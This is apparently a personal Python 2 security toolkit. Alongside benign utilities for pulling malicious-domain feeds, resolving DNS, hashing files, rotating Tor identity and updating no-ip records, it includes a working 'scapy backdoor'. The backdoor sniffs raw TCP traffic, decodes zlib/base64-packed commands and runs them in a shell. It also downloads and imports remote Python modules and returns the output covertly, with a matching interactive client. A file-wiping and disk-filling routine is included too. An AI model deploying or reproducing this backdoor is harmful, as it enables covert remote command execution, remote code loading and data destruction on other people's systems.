#!/usr/bin/python

''' Yes yes, I could have made a dict with a function and parse everything through the function and use that as main, buuuuuuuut trying to get this running for now. maybe later.'''
try:
 import pip
except:
 print "basic libs required: pip"
 exit()
try:
 import os
except:
 print "basic libs required: os"
try:
 import sys
except:
 print "basic libs required: sys"
try:
 import requests
except:
 print "basic libs required"
 try:
  if pip:
   pip.main(['install','requests'])
 except:
  print "install requests, or pip"
  exit()
try:
 import random
except:
 print "basic libs required"
 try:
  if pip:
   pip.main(['install','random'])
 except:
  print "install random, or pip"
try:
 import scapy
except:
 print "basic libs required"
 try:
  if pip:
   pip.main(['install','scapy'])
 except:
  print "install scapy, or pip"
  exit()
try:
 import scapy.all
except:
 print "basic libs required"
 try:
  if pip:
   pip.main(['install','scapy'])
 except:
  print "install scapy, or pip"
  exit()
try:
 import dns
except:
 print "basic libs required: dns"
 try:
  if pip:
   pip.main(['install','pydns'])
 except:
  print "install pydns, or pip"
  exit()
try:
 import argparse
except:
 print "basic libs required: argparse"
 try:
  if pip:
   pip.main(['install','argparse'])
 except:
  print "install scapy, or pip"
  exit()
try:
 import dns.resolver
except:
 print "basic libs required"
 try:
  if pip:
   pip.main(['install','pydns'])
 except:
  print "install pydns, or pip"
  exit()
try:
 import time
except:
 print "basic libs required"
 try:
  if pip:
   pip.main(['install','time'])
 except:
  print "install time, or pip"
  exit()
try:
 import urllib
except:
 print "basic libs required"
 try:
  if pip:
   pip.main(['install','urllib'])
 except:
  print "install urllib, or pip"
  exit()
try:
 import threading
except:
 print "basic libs required"
 try:
  if pip:
   pip.main(['install','threading'])
 except:
  print "install threading, or pip"
  exit()
try:
 import hashlib
except:
 print "basic libs required: hashlib"
 try:
  if pip:
   pip.main(['install','hashlib'])
 except:
  print "install hashlib, or pip"
  exit()


from scapy.all import *

parser=argparse.ArgumentParser()
subparsers = parser.add_subparsers()
resolverlist=[]
newresolverlist=[]
for i in requests.get('https://public-dns.info//nameservers-all.txt').text.split('\n'):
 resolverlist.append(i)
for i in range(1,10):
 newresolverlist.append(random.choice(resolverlist))
resolverlist=newresolverlist
newresolverlist=''
del newresolverlist
useragentlist=[]
newuseragentlist=[]
for i in requests.get('https://raw.githubusercontent.com/cvandeplas/pystemon/master/user-agents.txt').text.split('\n'):
 useragentlist.append(i)
for i in range(1,10):
 newuseragentlist.append(random.choice(useragentlist))
useragentlist=newuseragentlist
newuseragentlist=""
del newuseragentlist

"""=== These functions collect reportedly malicious domains ==="""
def pullDomainsFromHA(run):
 """ For future reference, this needs a useragent, but this should really be generated, remind me to do that"""
 global useragentlist
 a=requests.get('https://www.hybrid-analysis.com/feed?json',headers={"user-agent":random.choice(useragentlist)}).json()['data']
 domainlist=[]
 for i in a:
  try:
   if i['domains']:
    for o in i['domains']:
     domainlist.append(o)
  except:
   pass
 try:
  return list(set(domainlist))
 except:
  return "failed"

def pullDomainsFromRIT(run):
 """ For future reference, this needs a useragent, but this should really be generated, remind me to do that"""
 global useragentlist
 a=requests.get('https://www.reverse.it/feed?json',headers={"user-agent":random.choice(useragentlist)}).json()['data']
 domainlist=[]
 for i in a:
  try:
   if i['domains']:
    for o in i['domains']:
     domainlist.append(o)
  except:
   pass
 try:
  return list(set(domainlist))
 except:
  return "failed"

def blockList1(run):
 domainlist=[]
 for i in requests.get('https://lists.malwarepatrol.net/cgi/getfile?receipt=f1512036426&product=8&list=smoothwall').text.split("\n"):
  try:
   domainlist.append(i.split("//")[-1].split("/")[0])
  except:
   pass
 try:
  return list(set(domainlist))
 except:
  return "failed"

def malwareDomains(run):
 domainlist=[]
 for i in requests.get('http://malwaredomains.lehigh.edu/files/domains.txt').text.split('\n'):
  try:
   if "#" in i:
    pass
   else:
    domainlist.append(i.split("\t")[2])
  except:
   pass
 try:
  return list(set(domainlist))
 except:
  return "failed"

"""=== END Malicious domain collcetion === """

"""=== print stuff for parsing with other tools==="""
def printlist(run):
 '''Doing it this way so I can add more as more functions are made, keeps it modular, without accidently letting other functions run'''
 funclist=[pullDomainsFromHA,blockList1,malwareDomains,pullDomainsFromRIT]
 collectivelist=[]
 for i in funclist:
  domainlist=i(run)
  for o in domainlist:
   collectivelist.append(o)
 try:
   for p in list(set(collectivelist)):
    print p
 except:
   print "failed"

parser_printlists=subparsers.add_parser('domains', help="prints collective list")
parser_printlists.set_defaults(func=printlist)
"""=== End printing stuff==="""

"""=== Resolving and saving domain details ==="""
def domainresolution(run):
 funclist=[pullDomainsFromHA,blockList1,malwareDomains,pullDomainsFromRIT]
 collectivelist=[]
 for i in funclist:
  domainlist=i(run)
  for o in domainlist:
   collectivelist.append(o)
 ''' clearing for memory usage purposes'''
 domainlist=''
 funclist=''
 open('domainlist.json','wb').write("")
 filetowrite=open('domainlist.json','a')
 for i in list(set(collectivelist)):
  if i == "":
   pass
  elif type(i) == None:
   pass
  else:
   domain,ip,timestamp,nameserver=resolveip(i)
   filetowrite.write(str(dict({'Domain':domain,"Data":{'IP': ip, "Timestamp":timestamp, "Resolving Server":nameserver}})))

def resolveip(domain):
 domain=domain
 resolvethis=dns.resolver.Resolver()
 global resovlerlist
 '''Using random choice to avoid getting hit by blocks, but also to be capable of identifying geographic or per server deviance between runs'''
 resolvethis.nameservers=[random.choice(resolverlist)]
 try:
  ip=str(dns.resolver.query(domain, 'A')[0])
 except:
  ip="0.0.0.0"
 timestamp=time.strftime("%T-%x")
 return domain, ip, timestamp, resolvethis.nameservers

parser_reportdomains=subparsers.add_parser('report', help="generates a report on domains in json format")
parser_reportdomains.set_defaults(func=domainresolution)
"""=== End domain details==="""

"""=== Begin scapy backdoor ==="""
def threadsForListening(pkt):
 t=threading.Timer(1,actionForListening,args=(pkt),)
 try:
  t.start()
 except:
  pass

def actionForListening(pkt):
 '''for debugging'''
 try:
  if pkt.haslayer("Raw"):
   if pkt[TCP].flags == 24:
    try:
     command=str(pkt[Raw]).decode('zip').decode('base64')
     command=urllib.unquote(command)
    except:
     command=""
    try:
     if "test?=" in command:
      scapy.all.send(IP(dst=pkt[IP].src)/TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,flags="A")/Raw("test successful".encode('base64').encode('zip')))
     elif "cmd?=" in command:
      command2=command.split("=")[1]
      output=str(subprocess.check_output(str(command2), shell=True))
      scapy.all.send(IP(dst=pkt[IP].src)/TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,flags="A")/Raw(str(output).encode('base64').encode('zip')))
     elif "function?=" in command:
      command2=command.split("=")[1]
      scapy.all.send(IP(dst=pkt[IP].src)/TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,flags="A")/Raw("Attempting...".encode('base64').encode('zip')))
      scapy.all.send(IP(dst=pkt[IP].src)/TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,flags="A")/Raw(str(globals()[command2]("run")).encode('base64').encode('zip')))
     elif "module?=" in command:
      command2=command.split("=")[1]
      name=str(random.randrange(9999,9999999))
      try:
       open(str(name)+".py","wb").write(str(requests.get(command2).text))
      except:
       print "failed: %s" % str(sys.exc_info())
      try:
       __import__(str(name))
       workedorno="worked"
      except:
       workedorno="failed: %s" % str(sys.exc_info())
       print "failed: %s" % str(sys.exc_info())
      scapy.all.send(IP(dst=pkt[IP].src)/TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,flags="A")/Raw(str(workedorno).encode('base64').encode('zip')))
     else:
      print "unmatched commands"
    except:
     print "failed due to %s" % str(sys.exc_info())
     scapy.all.send(IP(dst=pkt[IP].src)/TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,flags="A")/Raw("==problems occured==".encode('base64').encode('zip')))
 except:
  print "Failed doing anything. %s" % str(sys.exc_info())
  pass

def actionForSending(pkt):
 try:
  if pkt.haslayer("Raw"):
   print str(pkt[Raw]).decode('zip').decode('base64')
  else:
   pass
 except:
  print "failed: %s" % str(sys.exc_info())
  pass

def listener(args):
# If you want this more interactively (debugging?)
# listenport=raw_input("port: ")
 listenport=int(args.p)
 sniff(filter="port %s" % listenport,prn=threadsForListening)

def connectorz(args):
 host, port = str(args.host).split(":")
 port=int(port)
 print "=== Backdoor command list ===\n\rtest=test\n\rcmd=/bin/bash\n\rfunction=functionName\n\rmodule=http://whatever/whatever\n"
 while True:
  command=raw_input("\nCommand: $")
  command=urllib.quote(str(command).replace("=","?="))
  a=IP(dst=host)/TCP(sport=random.randrange(1024,65350),dport=port,flags="PA")/Raw(str(command).encode('base64').encode('zip'))
  scapy.all.send(a)
  sniff(filter="port %s or port %s" % (str(port), str(a[TCP].sport)),prn=actionForSending, count=2)


parser_shellListen=subparsers.add_parser('listen', help="becomes service listener")
parser_shellListen.add_argument('-p',help="assign port from cli")
parser_shellListen.set_defaults(func=listener)

parser_shellConnect=subparsers.add_parser('connect', help="connects to service:\n\rtest=test\n\rcmd=/bin/bash\n\rfunction=functionName\n\rmodule=http://whatever/whatever")
parser_shellConnect.add_argument('--host',help="assign host:port from cli")
parser_shellConnect.set_defaults(func=connectorz)


"""=== End scapy backdoor==="""

"""=== File Destroy ==="""
''' just 0 fills and removes, then wastes space'''
''' Worth noting: not very well planned, do not rely on this to keep you safe. File pointers are still recoverable, for what it's worth.'''
''' Maybe later I'll add functions like checking if it's a directory or preparsing bad data. Until then, you're on your own.'''
def fileDestroy(args):
 fileToZero=str(args.file)
 with open(fileToZero,'ab') as f:
  count=int(len(open(fileToZero,'rb').read()))
  open(fileToZero,'wb').write("00".decode('hex'))
  for i in range(0,count):
   f.write('00'.decode('hex'))
 os.remove(fileToZero)
 lovelyfile=str(random.randrange(9999,699999))+"txt"
 with open(str(lovelyfile),'wb') as f:
  while True:
   f.write('FF'.decode('hex'))
 os.remove(lovelyfile)

parser_fileDestroy=subparsers.add_parser('0fill', help="blows away single file")
parser_fileDestroy.add_argument('--file',help="--file /{path}/filename{}, if winderps remember to double line //")
parser_fileDestroy.set_defaults(func=fileDestroy)

"""=== End file Destroy ==="""

"""=== noip random updater ==="""
''' Lacks the full version's capabilities because this is being made as a part of this toolkit. Automation is lacking here.'''
def noip(args):
 s=requests.session()
 print args.domain+" == "+args.ipaddress
 print "Request being sent from (validates proxy): "+s.get("http://icanhazip.com/", verify=False, headers={"User-Agent":"%s MaraAnn's no-ip updater %s" % (random.choice(string.ascii_uppercase + string.digits), random.choice(string.ascii_uppercase + string.digits))}).text
 print s.post('''http://'''+str(args.username)+":"+str(args.password)+"@"+'''dynupdate.no-ip.com/nic/update?hostname=%s&myip=%s''' % (str(args.domain), str(args.ipaddress)), verify=False, headers={"User-Agent":"%s MaraAnn's no-ip updater %s" % (str(random.choice(string.ascii_uppercase + string.digits)), str(random.choice(string.ascii_uppercase + string.digits)))}).text


parser_noipUpdate=subparsers.add_parser('noip', help="update noip domains (also validates proxies)")
parser_noipUpdate.add_argument('--domain',help="domain name you're trying to update")
parser_noipUpdate.add_argument('--username',help="login Username")
parser_noipUpdate.add_argument('--password',help="login Password")
parser_noipUpdate.add_argument('--ipaddress',help="ipaddress *(if you want automated rotated ips, try fetching an ip pool then running from a random choice of that)* ")
parser_noipUpdate.set_defaults(func=noip)

"""=== End noip ==="""

"""=== research single domain==="""
"""=== Eng Single domain==="""

"""=== research ip(s)==="""
"""=== End ip ==="""

"""=== Generate Usernames==="""
def parseUserData(data):
	# define data
	firstname=data[0]['name']['first']
	lastname=data[0]['name']['last']
	gender=data[0]['gender']
	username=data[0]['login']['username']
	password=data[0]['login']['password']
	print "\n------------------------------"
	print "Generated data: "
	print "Name: %s %s" % (firstname, lastname)
	print "Gender: %s" % gender
	print "Login: %s" % username
	print "Password %s" % password
	print "------------------------------\n"
def generateUserData(run):
	parseUserData(requests.get('http://randomuser.me/api',verify=False).json()['results'])
	time.sleep(random.randrange(45,300))
	generateUserData("")

parser_randomUser=subparsers.add_parser('usernames', help="Scrolls generated user data")
parser_randomUser.set_defaults(func=generateUserData)
"""=== End Usernames==="""

"""=== File hashing==="""
def hashes(type, content):
    if type == "md5":
        m=hashlib.md5(content)
    elif type == "sha1":
        m=hashlib.sha1(content)
    elif type == "sha256":
        m=hashlib.sha256(content)
    elif type == "sha512":
        m=hashlib.sha512(content)
    else:
        print "unknown type"+str(type)
    return str(type)+": "+str(m.hexdigest())
def fileHashes(args):
    infile = open(args.file, "rb")
    content = infile.read()
    infile.close()
    print hashes("md5", content)
    print hashes("sha1", content)
    print hashes("sha256", content)
    print hashes("sha512", content)

parser_fileHashes=subparsers.add_parser('hashes', help="generate hashes from file")
parser_fileHashes.add_argument('--file',help="--file /{path}/filename{}, if winderps remember to double line //")
parser_fileHashes.set_defaults(func=fileHashes)
"""=== End hashing==="""

"""=== Tor controller ==="""

def resetTor(run):
 try:
  import stem
 except:
  print "yeah not happening"
  exit()
  import stem.connection
  from stem import Signal
  from stem.control import Controller
  ''' if you need to auth to your tor client, just add the line for controller.authenticate(password='whatever') before the controller.signal'''
  with Controller.from_port(port = 9051) as controller:
        controller.signal(Signal.NEWNYM)
        controller.close()


parser_resetTor=subparsers.add_parser('resettor', help="If you have tor management setup (9051) without auth, then you don't need to do anything, just run it.")
parser_resetTor.set_defaults(func=resetTor)

"""=== END Tor==="""

"""=== Ghostbin Dump webpages or files ==="""
def ghostsource(args):
    data={"text": str(requests.get(args.url, verify=False).text), "expire": "-1", "lang":"text"}
    print requests.post("https://ghostbin.com/paste/new", data=data, verify=False).url

parser_ghost=subparsers.add_parser('ghost', help="Checks page and uploads it's source to ghostbin")
parser_ghost.add_argument('--url',help="--url https://whatever.whatever")
parser_ghost.set_defaults(func=ghostsource)

"""=== END Ghost ==="""



args=parser.parse_args()
args.func(args)
